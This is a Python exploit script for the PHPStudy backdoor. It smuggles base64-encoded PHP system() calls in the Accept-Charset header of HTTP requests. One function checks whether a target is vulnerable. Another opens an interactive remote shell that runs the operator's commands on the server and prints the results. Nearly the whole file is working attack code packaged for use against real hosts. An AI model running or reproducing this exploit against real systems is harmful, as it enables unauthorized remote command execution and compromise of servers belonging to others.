#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   PHPStudy_Backdoor.py
@Time    :   2019/09/23 19:17:02
@Author  :   fuhei 
@Version :   1.0
@Blog    :   http://www.lovei.org
'''

import requests
import base64
import sys

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Sec-Fetch-Site': 'none',
    'accept-charset': 'ZXhpdCgnZnVoZWk2NjYnKTs=',
    'Accept-Encoding': 'gzip,deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
}

def exp(url, command="whoami"):
    command = "system(\"" + command + "\");"
    command = base64.b64encode(command.encode('utf-8'))
    headers['accept-charset'] = str(command, 'utf-8')
    user = result = requests.get(url, headers=headers, verify=False).text.split('<!')[0].strip('\r\n')
    while(1):
        command = input(user+"@fuhei$ ")
        if command == 'exit' or command  == 'quit':
            break
        else:
            command = "system(\"" + command + "\");"
            command = base64.b64encode(command.encode('utf-8'))
            headers['accept-charset'] = str(command, 'utf-8')
            result = requests.get(url, headers=headers, verify=False)
            result.encoding = "GBK"
            result = result.text.split('<!')
            if 'Cannot execute a blank command in' in result[0]:
                pass
            else:
                print(result[0], end="")

def check(url):
    result = requests.get(url, headers=headers, verify=False)
    if result.status_code == 200 and 'fuhei666' in result.text:
        print("[+] Remote code execution vulnerability exists at the target address")
        return True
    else:
        print("[-] There is no remote code execution vulnerability in the target address")
        return False

if __name__ == '__main__':
    if len(sys.argv) == 2:     
        url = sys.argv[1]
        if check(url):
            exp(url)
    else:
        print("[!] Usage python3 PHPStudy_Backdoor.py http://www.lovei.org/")
